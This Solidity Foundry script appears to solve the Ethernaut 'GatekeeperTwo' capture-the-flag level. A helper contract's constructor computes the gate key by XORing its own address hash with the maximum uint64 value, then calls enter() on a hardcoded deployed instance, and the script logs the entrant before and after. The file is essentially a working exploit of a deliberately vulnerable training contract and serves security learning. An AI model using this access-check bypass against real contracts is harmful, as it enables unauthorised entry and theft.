// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    constructor(GatekeeperTwo gkt_) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gkt_.enter(gateKey);
    }
}

contract GateKeeperTwoSol is Script {
    GatekeeperTwo public gkt_ = GatekeeperTwo(0x128f5B1E62D86BA232A252A78aC9054f53800889);

    function run() external {
        vm.startBroadcast();
    
        console.log("Before entrant: ", gkt_.entrant());
        Ex ex = new Ex(gkt_);
        console.log("After entrant: ", gkt_.entrant());

        vm.stopBroadcast();
    }
}